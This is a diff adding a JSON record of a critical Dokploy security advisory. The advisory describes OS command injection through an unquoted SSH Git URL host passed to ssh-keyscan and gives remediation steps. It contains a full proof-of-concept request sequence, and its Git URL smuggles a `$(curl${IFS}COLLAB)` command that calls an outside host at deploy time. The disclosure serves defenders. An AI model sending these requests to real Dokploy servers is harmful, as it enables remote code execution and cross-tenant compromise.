@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-6693-xv3f-69px",
+  "repo": {
+    "cve_id": "CVE-2026-72740",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "| | |\r\n|---|---|\r\n| **Affected version** | v0.29.8 (commit `e9a0932b2`) |\r\n| **Component** | `@dokploy/server` - Custom Git source (SSH variant) |\r\n| **Authentication** | Authenticated; `member` with service deploy permission |\r\n| **Status** | Confirmed via out-of-band code execution (Burp Collaborator) |\r\n\r\n## 1. Summary\r\nWhen a \"Custom Git\" source uses an SSH URL (and an SSH key is attached), Dokploy adds the host to\r\n`known_hosts` via `ssh-keyscan -p ${port} ${domain}`, where `domain` is parsed from the user-supplied\r\n`customGitUrl` and interpolated **unquoted**. The parser's regex permits shell metacharacters in the\r\nhost group, so a crafted SSH URL injects a command that executes via `/bin/sh -c` at deploy time. (The\r\nsame SSH-form `customGitUrl` also reaches the unquoted `git clone ... ${customGitUrl}` line - cf.\r\nDOKPLOY-RCE-001 for the HTTPS variant.)\r\n\r\n## 2. Affected code\r\n- **Sink** - `packages/server/src/utils/providers/git.ts:114` (`addHostToKnownHostsCommand`)\r\n  ```js\r\n  return `ssh-keyscan -p ${port} ${domain} >> ${knownHostsPath};`;   // ${domain} unquoted\r\n  ```\r\n  Reached from `cloneGitRepository` (`git.ts:54-59`) when `isHttpOrHttps(customGitUrl) === false` and a\r\n  `customGitSSHKeyId` is set; executed via `execAsync`/`execAsyncRemote` (`services/application.ts`).\r\n- **Permissive parser** - `sanitizeRepoPathSSH` (`git.ts:119`) extracts the host with\r\n  `(?<domain>[^\\s/?#:]+)`, which blocks space `/ : ? #` but **allows `$ ( ) ; | & \\` { }`**. So\r\n  `customGitUrl = git@x$(curl${IFS}<host>)/o/r.git` yields `domain = x$(curl${IFS}<host>)`. `port` is\r\n  `[0-9]{1,5}` (safe).\r\n- **Entry point (no validation)** - `application.saveGitProvider` stores `customGitUrl` verbatim;\r\n  `apiSaveGitProvider` has no content regex on `customGitUrl`.\r\n\r\n## 3. Authorization / reachability\r\n`saveGitProvider` + `deploy` are gated only by `checkServicePermissionAndAccess` (no org check for\r\nowner/admin). Requires an SSH key to be attached (`customGitSSHKeyId`). Reachable by a `member`, and\r\ncross-tenant by an owner/admin of another organization.\r\n\r\n## 4. Proof of Concept (Burp)\r\n**Step 0 - Authenticate** (Appendix A). **Step 1** - create a project + application → `APP_ID`.\r\n\r\n**Step 2 - Create an SSH key** (the `privateKey` is format-validated, so use a real OpenSSH key, e.g.\r\n`ssh-keygen -t ed25519 -N \"\" -f key`):\r\n```http\r\nPOST /api/trpc/sshKey.create?batch=1 HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/json\r\nCookie: better-auth.session_token=COOKIE\r\nConnection: close\r\n\r\n{\"0\":{\"json\":{\"name\":\"poc\",\"publicKey\":\"ssh-ed25519 AAAA... poc\",\"privateKey\":\"-----BEGIN OPENSSH PRIVATE KEY-----\\n...\\n-----END OPENSSH PRIVATE KEY-----\\n\",\"organizationId\":\"ORG_ID\"}}}\r\n```\r\nRead the new `sshKeyId` via `GET /api/trpc/sshKey.all?batch=1&input=...`.\r\n\r\n**Step 3 - Bind an SSH-form `customGitUrl` with the payload in the host, plus the SSH key:**\r\n```http\r\nPOST /api/trpc/application.saveGitProvider?batch=1 HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/json\r\nCookie: better-auth.session_token=COOKIE\r\nConnection: close\r\n\r\n{\"0\":{\"json\":{\"applicationId\":\"APP_ID\",\"customGitUrl\":\"git@x$(curl${IFS}COLLAB)/o/r.git\",\"customGitBranch\":\"main\",\"customGitBuildPath\":\"/\",\"customGitSSHKeyId\":\"SSH_KEY_ID\",\"watchPaths\":[],\"enableSubmodules\":false}}}\r\n```\r\n\r\n**Step 4 - Deploy:**\r\n```http\r\nPOST /api/trpc/application.deploy?batch=1 HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/json\r\nCookie: better-auth.session_token=COOKIE\r\nConnection: close\r\n\r\n{\"0\":{\"json\":{\"applicationId\":\"APP_ID\"}}}\r\n```\r\n\r\n**Step 5 - Observe.** The Collaborator receives an HTTP request (`User-Agent: curl/8.18.0`) from the\r\nDokploy host - the `$(curl${IFS}COLLAB)` in the SSH URL's host executed via `ssh-keyscan`. The SSH\r\nkey's `lastUsedAt` is updated, confirming the SSH clone branch ran.\r\n\r\n## 5. Impact\r\nArbitrary OS command execution on the host (or `serverId`) as the Dokploy server process. Cross-tenant\r\nvia an owner/admin of another organization.\r\n\r\n## 6. Remediation\r\n- Tighten the `sanitizeRepoPathSSH` host group to a strict hostname charset (`[A-Za-z0-9.-]+`) and\r\n  reject shell metacharacters. Build `ssh-keyscan`/`git` invocations with `execFile`/argument arrays.\r\n  Validate `customGitUrl` at the resolver. Enforce tenant isolation.\r\n\r\n## Appendix A - Authentication\r\n```http\r\nPOST /api/auth/sign-in/email HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"email\":\"USER@EXAMPLE.COM\",\"password\":\"PASSWORD\"}\r\n```",
+    "ghsa_id": "GHSA-6693-xv3f-69px",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-6693-xv3f-69px",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-6693-xv3f-69px"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72740"
+      }
+    ],
+    "published_at": "2026-07-21T23:24:50Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "OS Command Injection via SSH-form `customGitUrl` domain in `ssh-keyscan`",
+    "updated_at": "2026-08-10T17:55:05Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "Dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "< 0.29.8 "
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
